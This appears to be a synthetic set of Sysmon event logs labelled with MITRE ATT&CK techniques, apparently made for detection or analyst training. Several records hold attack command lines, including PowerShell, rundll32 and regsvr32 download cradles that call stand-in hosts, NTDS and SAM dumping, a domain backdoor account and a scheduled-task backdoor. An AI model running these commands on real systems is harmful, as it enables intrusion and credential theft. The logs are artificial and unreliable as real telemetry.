{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T14:23:45.123Z"}}, "EventData": {"RuleName": "technique_id=T1059.001,technique_name=PowerShell", "UtcTime": "2026-01-02 14:23:45.123", "ProcessGuid": "{a23d45b-4f2e-5d6a-0000-0010e8b60100}", "ProcessId": "4512", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.19041.1", "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1')\"", "CurrentDirectory": "C:\\Users\\John\\Downloads\\", "User": "CORP\\John", "LogonGuid": "{a23d45b-4e2f-5d6a-0000-0020a4b10100}", "LogonId": "0x1b1a4", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=A1B2C3D4E5F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF12", "ParentProcessGuid": "{a23d45b-4e2e-5d6a-0000-0010c7b10100}", "ParentProcessId": "2144", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe /c powershell.exe -NoP -NonI"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 10, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T14:44:12.456Z"}}, "EventData": {"RuleName": "technique_id=T1003.001,technique_name=LSASS Memory", "UtcTime": "2026-01-02 14:44:12.456", "SourceProcessGUID": "{a23d45b-5012-5d6a-0000-0010f9c20200}", "SourceProcessId": "3344", "SourceThreadId": "2856", "SourceImage": "C:\\temp\\mimikatz.exe", "TargetProcessGUID": "{a23d45b-4e1d-5d6a-0000-00102c010100}", "TargetProcessId": "680", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1010", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9f3d4|C:\\Windows\\System32\\KERNELBASE.dll+2ec3d|C:\\temp\\mimikatz.exe+1a3c|C:\\temp\\mimikatz.exe+3b44|C:\\temp\\mimikatz.exe+4d55|UNKNOWN(00000000028C0000)"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 11, "Computer": "workstation02.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T15:10:33.789Z"}}, "EventData": {"RuleName": "technique_id=T1105,technique_name=Ingress Tool Transfer", "UtcTime": "2026-01-02 15:10:33.789", "ProcessGuid": "{a23d45b-5134-5d6a-0000-0010a1d30300}", "ProcessId": "1876", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\Public\\nc.exe", "CreationUtcTime": "2026-01-02 15:10:33.789"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 3, "Computer": "workstation01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T15:15:22.111Z"}}, "EventData": {"RuleName": "technique_id=T1071.001,technique_name=Web Protocols", "UtcTime": "2026-01-02 15:15:22.111", "ProcessGuid": "{a23d45b-5145-5d6a-0000-0010b2e40400}", "ProcessId": "2344", "Image": "C:\\Windows\\System32\\rundll32.exe", "User": "CORP\\John", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.10.45", "SourceHostname": "workstation01.corp.local", "SourcePort": "49823", "SourcePortName": "-", "DestinationIsIpv6": "false", "DestinationIp": "185.220.101.45", "DestinationHostname": "c2-server.evil.com", "DestinationPort": "443", "DestinationPortName": "https"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "web-server01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T15:30:05.234Z"}}, "EventData": {"RuleName": "technique_id=T1505.003,technique_name=Web Shell", "UtcTime": "2026-01-02 15:30:05.234", "ProcessGuid": "{a23d45b-5201-5d6a-0000-0010d3f50500}", "ProcessId": "5612", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami", "CurrentDirectory": "C:\\inetpub\\wwwroot\\", "User": "IIS APPPOOL\\DefaultAppPool", "LogonGuid": "{a23d45b-5200-5d6a-0000-0020c4e50500}", "LogonId": "0x5e5c4", "TerminalSessionId": "0", "IntegrityLevel": "Low", "Hashes": "SHA256=B28D75715A8B3620ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890", "ParentProcessGuid": "{a23d45b-5200-5d6a-0000-0010b2d40500}", "ParentProcessId": "1024", "ParentImage": "c:\\windows\\system32\\inetsrv\\w3wp.exe", "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\""}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 13, "Computer": "workstation03.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T16:05:44.567Z"}}, "EventData": {"RuleName": "technique_id=T1547.001,technique_name=Registry Run Keys", "EventType": "SetValue", "UtcTime": "2026-01-02 16:05:44.567", "ProcessGuid": "{a23d45b-5312-5d6a-0000-0010e4060600}", "ProcessId": "3244", "Image": "C:\\Users\\Mike\\AppData\\Local\\Temp\\malware.exe", "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate", "Details": "C:\\Users\\Mike\\AppData\\Local\\Temp\\malware.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 8, "Computer": "workstation04.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T16:22:18.890Z"}}, "EventData": {"RuleName": "technique_id=T1055,technique_name=Process Injection", "UtcTime": "2026-01-02 16:22:18.890", "SourceProcessGuid": "{a23d45b-5423-5d6a-0000-0010f5170700}", "SourceProcessId": "2788", "SourceImage": "C:\\Users\\Mike\\AppData\\Roaming\\svchost.exe", "TargetProcessGuid": "{a23d45b-4e1e-5d6a-0000-001023020100}", "TargetProcessId": "1204", "TargetImage": "C:\\Windows\\explorer.exe", "NewThreadId": "4512", "StartAddress": "0x00007FF801B30000", "StartModule": "", "StartFunction": ""}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation05.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T16:45:30.123Z"}}, "EventData": {"RuleName": "technique_id=T1218.011,technique_name=Rundll32", "UtcTime": "2026-01-02 16:45:30.123", "ProcessGuid": "{a23d45b-5534-5d6a-0000-001006280800}", "ProcessId": "3456", "Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://malware-site.com/payload.sct\").Exec();", "CurrentDirectory": "C:\\Users\\Sarah\\Downloads\\", "User": "CORP\\Sarah", "LogonGuid": "{a23d45b-5533-5d6a-0000-002017270800}", "LogonId": "0x82717", "TerminalSessionId": "2", "IntegrityLevel": "Medium", "Hashes": "SHA256=C3D4E5F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456", "ParentProcessGuid": "{a23d45b-5532-5d6a-0000-0010f5260800}", "ParentProcessId": "2456", "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 22, "Computer": "workstation06.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T17:10:15.456Z"}}, "EventData": {"RuleName": "technique_id=T1071.004,technique_name=DNS", "UtcTime": "2026-01-02 17:10:15.456", "ProcessGuid": "{a23d45b-5645-5d6a-0000-001017390900}", "ProcessId": "4112", "QueryName": "a1b2c3d4e5f6.dga-malware-domain.net", "QueryStatus": "0", "QueryResults": "type:  5 185.220.102.67;", "Image": "C:\\Users\\Tom\\AppData\\Local\\Temp\\update.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 7, "Computer": "workstation07.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T17:33:42.789Z"}}, "EventData": {"RuleName": "technique_id=T1574.002,technique_name=DLL Side-Loading", "UtcTime": "2026-01-02 17:33:42.789", "ProcessGuid": "{a23d45b-5756-5d6a-0000-0010284a0a00}", "ProcessId": "2688", "Image": "C:\\Program Files\\LegitApp\\LegitApp.exe", "ImageLoaded": "C:\\Program Files\\LegitApp\\malicious.dll", "FileVersion": "1.0.0.0", "Description": "", "Product": "", "Company": "", "OriginalFileName": "legitimate.dll", "Hashes": "SHA256=D4E5F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF12345678", "Signed": "false", "Signature": "", "SignatureStatus": "unsigned"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T18:05:12.012Z"}}, "EventData": {"RuleName": "technique_id=T1136.002,technique_name=Domain Account", "UtcTime": "2026-01-02 18:05:12.012", "ProcessGuid": "{a23d45b-5867-5d6a-0000-0010395b0b00}", "ProcessId": "3912", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user hacker P@ssw0rd123! /add /domain", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\Administrator", "LogonGuid": "{a23d45b-4e1e-5d6a-0000-0020e4030100}", "LogonId": "0x3e4", "TerminalSessionId": "0", "IntegrityLevel": "High", "Hashes": "SHA256=E5F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890", "ParentProcessGuid": "{a23d45b-5866-5d6a-0000-00102a5a0b00}", "ParentProcessId": "3888", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation08.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T18:20:45.345Z"}}, "EventData": {"RuleName": "technique_id=T1027,technique_name=Obfuscated Files", "UtcTime": "2026-01-02 18:20:45.345", "ProcessGuid": "{a23d45b-5978-5d6a-0000-00104a6c0c00}", "ProcessId": "4224", "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -decode C:\\temp\\encoded.txt C:\\temp\\malware.exe", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\David", "LogonGuid": "{a23d45b-5977-5d6a-0000-00203b6b0c00}", "LogonId": "0xc6b3b", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=F6071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF12345678901A", "ParentProcessGuid": "{a23d45b-5976-5d6a-0000-00103c6a0c00}", "ParentProcessId": "2144", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 11, "Computer": "workstation09.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T18:45:33.678Z"}}, "EventData": {"RuleName": "technique_id=T1486,technique_name=Data Encrypted for Impact", "UtcTime": "2026-01-02 18:45:33.678", "ProcessGuid": "{a23d45b-5a89-5d6a-0000-00105b7d0d00}", "ProcessId": "5432", "Image": "C:\\Users\\Emma\\AppData\\Roaming\\system32.exe", "TargetFilename": "C:\\Users\\Emma\\Documents\\important.docx.encrypted", "CreationUtcTime": "2026-01-02 18:45:33.678"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation10.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T19:10:22.901Z"}}, "EventData": {"RuleName": "technique_id=T1053.005,technique_name=Scheduled Task", "UtcTime": "2026-01-02 19:10:22.901", "ProcessGuid": "{a23d45b-5b9a-5d6a-0000-00106c8e0e00}", "ProcessId": "3344", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \"WindowsUpdateCheck\" /tr \"C:\\temp\\backdoor.exe\" /sc onlogon /ru SYSTEM", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\Admin", "LogonGuid": "{a23d45b-5b99-5d6a-0000-00204d8d0e00}", "LogonId": "0xe8d4d", "TerminalSessionId": "1", "IntegrityLevel": "High", "Hashes": "SHA256=071829384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012AB", "ParentProcessGuid": "{a23d45b-5b98-5d6a-0000-00105e8c0e00}", "ParentProcessId": "2456", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 3, "Computer": "workstation11.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T19:35:55.234Z"}}, "EventData": {"RuleName": "technique_id=T1021.001,technique_name=Remote Desktop Protocol", "UtcTime": "2026-01-02 19:35:55.234", "ProcessGuid": "{a23d45b-5cab-5d6a-0000-00107d9f0f00}", "ProcessId": "1256", "Image": "C:\\Windows\\System32\\mstsc.exe", "User": "CORP\\Lisa", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.10.88", "SourceHostname": "workstation11.corp.local", "SourcePort": "52341", "SourcePortName": "-", "DestinationIsIpv6": "false", "DestinationIp": "192.168.10.10", "DestinationHostname": "dc01.corp.local", "DestinationPort": "3389", "DestinationPortName": "ms-wbt-server"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation12.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T20:05:10.567Z"}}, "EventData": {"RuleName": "technique_id=T1059.003,technique_name=Windows Command Shell", "UtcTime": "2026-01-02 20:05:10.567", "ProcessGuid": "{a23d45b-5dbc-5d6a-0000-00108ea01000}", "ProcessId": "4568", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c \"whoami && ipconfig && net user\"", "CurrentDirectory": "C:\\Users\\Public\\", "User": "CORP\\Guest", "LogonGuid": "{a23d45b-5dbb-5d6a-0000-00207f9f1000}", "LogonId": "0x109f7f", "TerminalSessionId": "2", "IntegrityLevel": "Medium", "Hashes": "SHA256=1829384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCD", "ParentProcessGuid": "{a23d45b-5dba-5d6a-0000-001070901000}", "ParentProcessId": "3344", "ParentImage": "C:\\Windows\\System32\\wscript.exe", "ParentCommandLine": "wscript.exe C:\\temp\\script.vbs"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 10, "Computer": "workstation13.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T20:30:44.890Z"}}, "EventData": {"RuleName": "technique_id=T1055.012,technique_name=Process Hollowing", "UtcTime": "2026-01-02 20:30:44.890", "SourceProcessGUID": "{a23d45b-5ecd-5d6a-0000-00109fb11100}", "SourceProcessId": "2788", "SourceThreadId": "3412", "SourceImage": "C:\\temp\\dropper.exe", "TargetProcessGUID": "{a23d45b-5ecc-5d6a-0000-001081b01100}", "TargetProcessId": "4456", "TargetImage": "C:\\Windows\\System32\\svchost.exe", "GrantedAccess": "0x1F3FFF", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+a23b4|C:\\Windows\\System32\\KERNELBASE.dll+3fc4e|C:\\temp\\dropper.exe+2b5c"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T21:00:15.123Z"}}, "EventData": {"RuleName": "technique_id=T1003.003,technique_name=NTDS", "UtcTime": "2026-01-02 21:00:15.123", "ProcessGuid": "{a23d45b-5fde-5d6a-0000-0010a0c21200}", "ProcessId": "5432", "Image": "C:\\Windows\\System32\\ntdsutil.exe", "CommandLine": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\dump\" q q", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\Administrator", "LogonGuid": "{a23d45b-4e1e-5d6a-0000-0020e4030100}", "LogonId": "0x3e4", "TerminalSessionId": "0", "IntegrityLevel": "High", "Hashes": "SHA256=29384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF", "ParentProcessGuid": "{a23d45b-5fdd-5d6a-0000-001092c11200}", "ParentProcessId": "4344", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 15, "Computer": "workstation14.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T21:25:33.456Z"}}, "EventData": {"RuleName": "technique_id=T1564.004,technique_name=NTFS File Attributes", "UtcTime": "2026-01-02 21:25:33.456", "ProcessGuid": "{a23d45b-60ef-5d6a-0000-0010b1d31300}", "ProcessId": "3244", "Image": "C:\\Windows\\System32\\cmd.exe", "TargetFilename": "C:\\Users\\Mark\\Downloads\\document.pdf:hidden.exe", "CreationUtcTime": "2026-01-02 21:25:33.456", "Hash": "SHA256=384756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation15.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T21:50:22.789Z"}}, "EventData": {"RuleName": "technique_id=T1218.010,technique_name=Regsvr32", "UtcTime": "2026-01-02 21:50:22.789", "ProcessGuid": "{a23d45b-6100-5d6a-0000-0010c2e41400}", "ProcessId": "4788", "Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32 /s /n /u /i:http://evil-site.com/malicious.sct scrobj.dll", "CurrentDirectory": "C:\\Users\\Anna\\Desktop\\", "User": "CORP\\Anna", "LogonGuid": "{a23d45b-60ff-5d6a-0000-0020d3e31400}", "LogonId": "0x14e3d3", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=4756ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234", "ParentProcessGuid": "{a23d45b-60fe-5d6a-0000-0010b4e21400}", "ParentProcessId": "2344", "ParentImage": "C:\\Windows\\System32\\wscript.exe", "ParentCommandLine": "wscript.exe malicious.js"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation16.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T22:15:10.012Z"}}, "EventData": {"RuleName": "technique_id=T1021.006,technique_name=Windows Remote Management", "UtcTime": "2026-01-02 22:15:10.012", "ProcessGuid": "{a23d45b-6211-5d6a-0000-0010d3f51500}", "ProcessId": "5012", "Image": "C:\\Windows\\System32\\wsmprovhost.exe", "CommandLine": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\RemoteAdmin", "LogonGuid": "{a23d45b-6210-5d6a-0000-0020e4041500}", "LogonId": "0x1504e4", "TerminalSessionId": "0", "IntegrityLevel": "High", "Hashes": "SHA256=56ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF123456", "ParentProcessGuid": "{a23d45b-4e20-5d6a-0000-0010f5060100}", "ParentProcessId": "1084", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 11, "Computer": "workstation17.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T22:40:45.345Z"}}, "EventData": {"RuleName": "technique_id=T1204.002,technique_name=Malicious File", "UtcTime": "2026-01-02 22:40:45.345", "ProcessGuid": "{a23d45b-6322-5d6a-0000-0010e4061600}", "ProcessId": "3456", "Image": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\Chris\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe", "CreationUtcTime": "2026-01-02 22:40:45.345"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T23:05:33.678Z"}}, "EventData": {"RuleName": "technique_id=T1558.003,technique_name=Kerberoasting", "UtcTime": "2026-01-02 23:05:33.678", "ProcessGuid": "{a23d45b-6433-5d6a-0000-0010f5171700}", "ProcessId": "4224", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -NonI -Command \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/sqlserver.corp.local'\"", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-6432-5d6a-0000-002006161700}", "LogonId": "0x171606", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=6ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567", "ParentProcessGuid": "{a23d45b-6431-5d6a-0000-0010f8151700}", "ParentProcessId": "2788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation18.corp.local", "TimeCreated": {"SystemTime": "2026-01-02T23:30:22.901Z"}}, "EventData": {"RuleName": "technique_id=T1087.002,technique_name=Domain Account Discovery", "UtcTime": "2026-01-02 23:30:22.901", "ProcessGuid": "{a23d45b-6544-5d6a-0000-001006281800}", "ProcessId": "3912", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group \"Domain Admins\" /domain", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\User01", "LogonGuid": "{a23d45b-6543-5d6a-0000-002017271800}", "LogonId": "0x182717", "TerminalSessionId": "2", "IntegrityLevel": "Medium", "Hashes": "SHA256=ABCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12345678", "ParentProcessGuid": "{a23d45b-6542-5d6a-0000-0010f9261800}", "ParentProcessId": "2456", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 3, "Computer": "workstation19.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T00:00:55.234Z"}}, "EventData": {"RuleName": "technique_id=T1071.001,technique_name=Web Protocols", "UtcTime": "2026-01-03 00:00:55.234", "ProcessGuid": "{a23d45b-6655-5d6a-0000-001017391900}", "ProcessId": "4568", "Image": "C:\\Windows\\System32\\bitsadmin.exe", "User": "CORP\\Mike", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.10.99", "SourceHostname": "workstation19.corp.local", "SourcePort": "49912", "SourcePortName": "-", "DestinationIsIpv6": "false", "DestinationIp": "203.0.113.50", "DestinationHostname": "download-server.evil.net", "DestinationPort": "80", "DestinationPortName": "http"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation20.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T00:25:10.567Z"}}, "EventData": {"RuleName": "technique_id=T1218.005,technique_name=Mshta", "UtcTime": "2026-01-03 00:25:10.567", "ProcessGuid": "{a23d45b-6766-5d6a-0000-00102a4a1a00}", "ProcessId": "5132", "Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdHJlAGEAbQ\"\", 0:window.close\")", "CurrentDirectory": "C:\\Users\\Peter\\Downloads\\", "User": "CORP\\Peter", "LogonGuid": "{a23d45b-6765-5d6a-0000-00203b491a00}", "LogonId": "0x1a493b", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=BCDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF123456789", "ParentProcessGuid": "{a23d45b-6764-5d6a-0000-00101c481a00}", "ParentProcessId": "2344", "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 13, "Computer": "workstation21.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T00:50:44.890Z"}}, "EventData": {"RuleName": "technique_id=T1112,technique_name=Modify Registry", "EventType": "SetValue", "UtcTime": "2026-01-03 00:50:44.890", "ProcessGuid": "{a23d45b-6877-5d6a-0000-00103b5b1b00}", "ProcessId": "3788", "Image": "C:\\temp\\malware.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA", "Details": "DWORD (0x00000000)"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T01:15:33.123Z"}}, "EventData": {"RuleName": "technique_id=T1003.002,technique_name=Security Account Manager", "UtcTime": "2026-01-03 01:15:33.123", "ProcessGuid": "{a23d45b-6988-5d6a-0000-00104c6c1c00}", "ProcessId": "4456", "Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg save HKLM\\SAM C:\\temp\\sam.hive", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\Administrator", "LogonGuid": "{a23d45b-4e1e-5d6a-0000-0020e4030100}", "LogonId": "0x3e4", "TerminalSessionId": "0", "IntegrityLevel": "High", "Hashes": "SHA256=CDEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12345678901", "ParentProcessGuid": "{a23d45b-6987-5d6a-0000-00103d6b1c00}", "ParentProcessId": "3912", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 7, "Computer": "workstation22.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T01:40:22.456Z"}}, "EventData": {"RuleName": "technique_id=T1129,technique_name=Shared Modules", "UtcTime": "2026-01-03 01:40:22.456", "ProcessGuid": "{a23d45b-6a99-5d6a-0000-00105d7d1d00}", "ProcessId": "2788", "Image": "C:\\Windows\\System32\\rundll32.exe", "ImageLoaded": "C:\\Users\\Public\\suspicious.dll", "FileVersion": "", "Description": "", "Product": "", "Company": "", "OriginalFileName": "", "Hashes": "SHA256=DEF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF123456789012", "Signed": "false", "Signature": "", "SignatureStatus": "unsigned"}}}
